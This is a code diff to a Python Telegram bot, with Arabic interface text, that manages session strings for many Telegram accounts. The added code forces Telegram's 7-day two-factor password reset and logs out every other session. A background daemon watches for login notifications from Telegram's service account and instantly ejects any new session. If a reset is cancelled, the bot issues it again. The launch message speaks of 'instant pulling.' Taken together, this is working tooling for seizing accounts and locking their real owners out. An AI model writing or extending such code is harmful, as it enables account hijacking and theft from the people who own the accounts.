@@ -2113,16 +2113,34 @@ async def monitor_and_leave(admin_id, target_username, golden_groups):
             pass
 
 
-
-
-
+import time
+import asyncio
+from pyrogram import Client, filters
+from pyrogram.handlers import MessageHandler
 from pyrogram.raw import functions
-from datetime import datetime
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.errors import AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan, FloodWait
 
 # ==========================================
-# 1. القوائم المخصصة لميزة الريست
+# 0. تحديث قاعدة البيانات تلقائياً (تجنب أخطاء الأعمدة)
 # ==========================================
+def update_db_for_reset_feature():
+    conn = get_db_conn()
+    c = conn.cursor()
+    try:
+        c.execute("ALTER TABLE sessions ADD COLUMN reset_retries INTEGER DEFAULT 0")
+        c.execute("ALTER TABLE sessions ADD COLUMN lockdown_mode INTEGER DEFAULT 0")
+        conn.commit()
+    except:
+        pass # الأعمدة موجودة مسبقاً
+    finally:
+        conn.close()
 
+update_db_for_reset_feature()
+
+# ==========================================
+# 1. القوائم المخصصة لميزة الريست (عزل تام عن النظام القديم)
+# ==========================================
 @bot.callback_query_handler(func=lambda call: call.data == "menu_pass_reset_manage")
 def pass_reset_main_menu(call):
     if not is_allowed(call.from_user.id): return
@@ -2131,26 +2149,34 @@ def pass_reset_main_menu(call):
     markup.row(InlineKeyboardButton("• فـحـص حـالـة الـريـسـت والـحـسـابـات 🔍", callback_data="pass_reset:check_all"))
     markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
     
-    text = "🛂┊ **إدارة إعـادة تـعـيـيـن كـلـمـات الـمـرور:**\n\n⎉╎ هـذا الـقـسـم مـخـصـص لـعـمـل (ريـسـت 7 أيـام) لـلـحـسـابـات ومـراقـبـتـهـا وطـرد أي جـلـسـة تـحـاول الـدخـول أثـنـاء فـتـرة الـريـسـت. ❤️‍🔥"
+    text = "🛂┊ **إدارة إعـادة تـعـيـيـن كـلـمـات الـمـرور:**\n\n⎉╎ هـذا الـقـسـم مـخـصـص لـعـمـل (ريـسـت 7 أيـام) لـلـحـسـابـات ومـراقـبـتـهـا وطـرد أي جـلـسـة تـحـاول الـدخـول بـشـكـل فـوري. ❤️‍🔥"
     bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+def pass_reset_keyboard(owner_id):
+    accounts = get_all_accounts(owner_id)
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="do_reset:all"))
+    for acc_id, phone, name, uid, _ in accounts:
+        markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"do_reset:{acc_id}"))
+    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="menu_pass_reset_manage"))
+    return markup
 
 @bot.callback_query_handler(func=lambda call: call.data == "pass_reset:start_menu")
 def pass_reset_start_menu(call):
     if not is_allowed(call.from_user.id): return
     bot.edit_message_text("🛂┊ إخـتـر الـحـسـاب لـبـدء الـريـسـت:\n\n⎉╎ سـيـتـم وضـع الـحـسـاب فـي وضـع الـقـفـل وتـنـفـيـذ الـريـسـت.",
                           call.message.chat.id, call.message.message_id, 
-                          reply_markup=accounts_action_keyboard(call.from_user.id, "start_reset"), parse_mode="Markdown")
+                          reply_markup=pass_reset_keyboard(call.from_user.id), parse_mode="Markdown")
 
 # ==========================================
-# 2. عملية بدء الريست (الكل أو حساب مفرد)
+# 2. عملية بدء الريست
 # ==========================================
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("act:start_reset:"))
+@bot.callback_query_handler(func=lambda call: call.data.startswith("do_reset:"))
 def handle_start_reset(call):
     if not is_allowed(call.from_user.id): return
     target = call.data.split(":")[-1]
     bot.answer_callback_query(call.id, "⏳ جاري تنفيذ أمر الريست...")
-    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري بـدء إعـادة الـتـعـيـيـن بـسـرعـة...", parse_mode="Markdown")
+    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري بـدء إعـادة الـتـعـيـيـن وتـفـعـيـل الـقـفـل بـسـرعـة...", parse_mode="Markdown")
     run_async(process_start_reset_async(call.from_user.id, target, status_msg.chat.id, status_msg.message_id))
 
 async def perform_single_reset(acc_id, phone, pyro_session):
@@ -2161,7 +2187,7 @@ async def perform_single_reset(acc_id, phone, pyro_session):
             password_info = await client.invoke(functions.account.GetPassword())
             
             if not password_info.has_password:
-                return f"⚠️ `{phone}` ┊ لا يـوجـد كـلـمـة مـرور بـالأسـاس!"
+                return f"✅ `{phone}` ┊ لا يـوجـد كـلـمـة مـرور (جـاهـز)."
             
             # ضرب ريست
             await client.invoke(functions.account.ResetPassword())
@@ -2174,14 +2200,18 @@ async def perform_single_reset(acc_id, phone, pyro_session):
             conn.close()
             
             # طرد باقي الجلسات لتفعيل القفل مباشرة
-            try: await client.invoke(functions.auth.ResetAuthorizations())
-            except: pass
+            try: 
+                await client.invoke(functions.auth.ResetAuthorizations())
+            except FloodWait: 
+                pass 
+            except Exception: 
+                pass
             
-            return f"✅ `{phone}` ┊ تـم بـدء الـريـسـت وتـفـعـيـل الـقـفـل."
+            return f"✅ `{phone}` ┊ تـم بـدء الـريـسـت وتـفـعـيـل الـقـفـل الـفـوري."
         except Exception as e:
             if "PASSWORD_RESET_NEW_CLIENTS" in str(e):
-                return f"❌ `{phone}` ┊ يـجـب انـتـظـار 24 سـاعـة قـبـل الـريـسـت (حـسـاب مـضـاف حـديـثـاً)."
-            return f"❌ `{phone}` ┊ فـشـل الـريـسـت."
+                return f"❌ `{phone}` ┊ انـتـظـر 24 سـاعـة قـبـل الـريـسـت."
+            return f"⚠️ `{phone}` ┊ فـشـل الـريـسـت (خـطـأ غـيـر مـتـوقـع)."
         finally:
             if client.is_connected: await client.disconnect()
 
@@ -2195,19 +2225,18 @@ async def process_start_reset_async(owner_id, target, chat_id, msg_id):
     
     success_count = sum(1 for r in results if "✅" in r)
     report = "\n".join(results)
-    final_text = f"🛂┊ **تـقـريـر بـدء الـريـسـت:**\n⎉╎ نـجـح: {success_count} مـن {len(accounts)}\n\n{report}"
+    final_text = f"🛂┊ **تـقـريـر بـدء الـريـسـت:**\n⎉╎ الـنـجـاح: {success_count} مـن {len(accounts)}\n\n{report}"
     
     bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
 
 # ==========================================
-# 3. نظام الفحص السريع الخرافي للريست (بـ 50 عامل)
+# 3. نظام الفحص المعمق للريست 
 # ==========================================
-
 @bot.callback_query_handler(func=lambda call: call.data == "pass_reset:check_all")
 def check_all_resets_handler(call):
     if not is_allowed(call.from_user.id): return
-    bot.answer_callback_query(call.id, "⏳ جاري الفحص المعمق لجميع الحسابات...")
-    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري فـحـص حـالـة الـريـسـت لـجـمـيـع الـحـسـابـات بـسـرعـة 50 اتـصـال...", parse_mode="Markdown")
+    bot.answer_callback_query(call.id, "⏳ جاري الفحص المعمق...")
+    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري فـحـص حـالـة الـريـسـت بـسـرعـة 50 اتـصـال...", parse_mode="Markdown")
     run_async(check_all_resets_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))
 
 async def check_single_reset_status(acc_id, phone, pyro_session, owner_id):
@@ -2217,66 +2246,64 @@ async def check_single_reset_status(acc_id, phone, pyro_session, owner_id):
         c.execute("SELECT reset_retries, lockdown_mode FROM sessions WHERE id=?", (acc_id,))
         row = c.fetchone()
         reset_retries = row[0] if row else 0
-        lockdown_mode = row[1] if row else 0
+        conn.close() 
         
         client = Client(f"chk_rs_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
         try:
             await asyncio.wait_for(client.connect(), timeout=10)
-            await client.get_me() # فحص هل الحساب مبند/محذوف/مسحوب
+            await client.get_me()
             
-            # جلب تفاصيل الباسوورد والريست
             info = await client.invoke(functions.account.GetPassword())
             
+            conn = get_db_conn()
+            c = conn.cursor()
+
             if not info.has_password:
-                # انتهى الريست وتدمرت كلمة المرور
                 c.execute("UPDATE sessions SET lockdown_mode=0, reset_retries=0 WHERE id=?", (acc_id,))
                 conn.commit()
                 conn.close()
                 return f"`{phone}` ┊ نـشـط ┊ انـتـهـى الـريـسـت وتـم تـعـطـيـل كـلـمـة الـمـرور ✅\n", 1
             
             if info.pending_reset_date:
-                # الريست شغال نحسب الوقت
-                diff = info.pending_reset_date - int(time.time())
+                diff = int(info.pending_reset_date) - int(time.time())
                 days = diff // 86400
                 hours = (diff % 86400) // 3600
-                time_str = f"{int(days)} أيـام" if days > 0 else f"{int(hours)} سـاعـات"
+                time_str = f"{days} أيـام" if days > 0 else f"{hours} سـاعـات"
                 
-                # تفعيل القفل إن لم يكن مفعل
                 c.execute("UPDATE sessions SET lockdown_mode=1 WHERE id=?", (acc_id,))
                 conn.commit()
                 conn.close()
                 return f"`{phone}` ┊ نـشـط ┊ تـبـقـى للـريـسـت {time_str} 🇵🇸\n", 1
                 
             else:
-                # الباسوورد موجود بس مافي pending_reset (يعني تم الإلغاء يدوياً)
                 if reset_retries < 2:
                     try:
                         await client.invoke(functions.account.ResetPassword())
-                        new_retries = reset_retries + 1
-                        c.execute("UPDATE sessions SET reset_retries=?, lockdown_mode=1 WHERE id=?", (new_retries, acc_id))
+                        c.execute("UPDATE sessions SET reset_retries=?, lockdown_mode=1 WHERE id=?", (reset_retries + 1, acc_id))
                         conn.commit()
                         conn.close()
                         return f"`{phone}` ┊ نـشـط ┊ تـم تـعـطـيـل الـريـسـت يـدويـًا وإعـادتـه ┊ 🇵🇸 ❌\n", 1
                     except Exception:
-                        return f"`{phone}` ┊ نـشـط ┊ تـم الإلـغـاء وفـشـلـت إعـادة الـمـحـاولـة ⚠️\n", 1
+                        conn.close()
+                        return f"`{phone}` ┊ نـشـط ┊ تـم الإلـغـاء يـدويـاً وفـشـلـت الإعـادة ⚠️\n", 1
                 else:
                     c.execute("UPDATE sessions SET lockdown_mode=0 WHERE id=?", (acc_id,))
                     conn.commit()
                     conn.close()
-                    return f"`{phone}` ┊ نـشـط ┊ تـم الإلـغـاء بـعـد مـحـاولـتـيـن (يـحـتـاج تـدخـل يـدوي) ❌\n", 1
+                    return f"`{phone}` ┊ نـشـط ┊ انـتـهـت مـحـاولات الـريـسـت ❌\n", 1
 
         except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
-            # التأكد الثلاثي وحذف الحساب
             delete_account(acc_id)
-            return f"❌ `{phone}` ┊ تـم حـذفـه بـرمـجـيـاً (مـجـمـد/مـحـذوف/مـفـقـود)\n", 0
+            return f"❌ `{phone}` ┊ تـم حـذفـه (مـبـنـد أو مـسـحـوب)\n", 0
         except Exception as e:
-            return f"⚠️ `{phone}` ┊ خـطـأ أثـنـاء الـفـحـص\n", 1
+            return f"⚠️ `{phone}` ┊ خـطـأ فـي الـشـبـكـة أثـنـاء الـفـحـص\n", 1
         finally:
             if client.is_connected: await client.disconnect()
 
 async def check_all_resets_async(owner_id, chat_id, msg_id):
     accounts = get_all_accounts(owner_id)
-    if not accounts: return bot.edit_message_text("❌ لا توجد حسابات.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
+    if not accounts: 
+        return bot.edit_message_text("❌ لا توجد حسابات مضافة.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
 
     tasks = [check_single_reset_status(acc_id, phone, pyro_session, owner_id) for acc_id, phone, name, uid, pyro_session in accounts]
     results = await asyncio.gather(*tasks)
@@ -2288,43 +2315,76 @@ async def check_all_resets_async(owner_id, chat_id, msg_id):
     bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
 
 # ==========================================
-# 4. المراقب الأمني (Lockdown Daemon) طرد تلقائي
+# 4. المراقب الأمني الحي (Real-Time Lockdown Daemon) 🔥
 # ==========================================
-# يتم استدعاء هذا التاسك ليعمل في الخلفية مرة واحدة عند بدء تشغيل البوت
+active_lockdown_clients = {}
+
+# هذا الهاندلر يصطاد أي رسالة من تيليجرام (777000) فوراً
+async def real_time_kick_handler(cli, message):
+    try:
+        # مجرد استلام رسالة من 777000 (إشعار الدخول) يتم طرد كل الجلسات فوراً
+        await cli.invoke(functions.auth.ResetAuthorizations())
+    except Exception:
+        pass
 
 async def lockdown_monitor_daemon():
+    last_full_sweep = time.time()
+    
     while True:
         try:
             conn = get_db_conn()
             c = conn.cursor()
-            # استهداف فقط الحسابات التي في وضع القفل Security Lockdown
-            c.execute("SELECT id, phone, pyro_session FROM sessions WHERE lockdown_mode = 1")
+            c.execute("SELECT id, pyro_session FROM sessions WHERE lockdown_mode = 1")
             lockdown_accounts = c.fetchall()
             conn.close()
 
-            for acc in lockdown_accounts:
-                acc_id, phone, pyro_session = acc
-                try:
-                    client = Client(f"lock_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
-                    await client.connect()
-                    # هذا السطر العنيف يطرد جميع الجلسات الأخرى فوراً
-                    await client.invoke(functions.auth.ResetAuthorizations())
-                    await client.disconnect()
-                except Exception:
-                    pass # تخطي الأخطاء بصمت لعدم إيقاف اللوب
-            
-            # ينام لمدة 10 دقائق ثم يفحص ويطرد الجلسات الدخيلة من جديد
-            await asyncio.sleep(600) 
-        except Exception:
-            await asyncio.sleep(60) # راحة عند الخطأ
+            current_locked_ids = {acc[0] for acc in lockdown_accounts}
 
-# تشغيل المراقب الأمني في الخلفية
+            # 1. إيقاف وإزالة الحسابات التي انتهى عنها القفل
+            to_remove = []
+            for acc_id in active_lockdown_clients:
+                if acc_id not in current_locked_ids:
+                    try: await active_lockdown_clients[acc_id].stop()
+                    except: pass
+                    to_remove.append(acc_id)
+            for acc_id in to_remove:
+                del active_lockdown_clients[acc_id]
+
+            # 2. تشغيل الحسابات الجديدة وربطها بالمراقب الفوري (Real-Time Listener)
+            for acc_id, pyro_session in lockdown_accounts:
+                if acc_id not in active_lockdown_clients:
+                    client = Client(f"rt_lock_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+                    # ربط الهاندلر لمراقبة حساب 777000
+                    client.add_handler(MessageHandler(real_time_kick_handler, filters.chat(777000)))
+                    
+                    try:
+                        await client.start()
+                        active_lockdown_clients[acc_id] = client
+                    except Exception:
+                        pass # إذا الجلسة ميتة نتجاهلها وسيتم حذفها وقت الفحص
+
+            # 3. الصيانة الاحتياطية (كل 20 دقيقة) كضمان إضافي في حال لم يصل الإشعار
+            if time.time() - last_full_sweep >= 1200:
+                for acc_id, cli in active_lockdown_clients.items():
+                    try:
+                        await cli.invoke(functions.auth.ResetAuthorizations())
+                    except Exception:
+                        pass
+                last_full_sweep = time.time()
+
+            # التحقق من القاعدة وتحديث الجلسات كل 30 ثانية (لا يستهلك موارد)
+            await asyncio.sleep(30)
+            
+        except Exception:
+            await asyncio.sleep(30)
+
 def start_lockdown_daemon():
     loop = asyncio.get_event_loop()
     loop.create_task(lockdown_monitor_daemon())
 
-# ضع هذا السطر في نهاية ملفك بعد تعريف البوت وقبل bot.polling() أو bot.infinity_polling()
+# 💡 لا تنسَ استدعاء الدالة قبل بدء تشغيل البوت:
 # start_lockdown_daemon()
+# bot.infinity_polling()
 
 
 
@@ -4587,6 +4647,10 @@ def execute_unsurveil(call):
 
 if __name__ == "__main__":
     logging.info("🚀 جاري إطلاق البوت بنظام السحب الفوري المباشر...")
+    
+
+    start_lockdown_daemon()
+    
     try:
         bot.remove_webhook()
     except Exception:
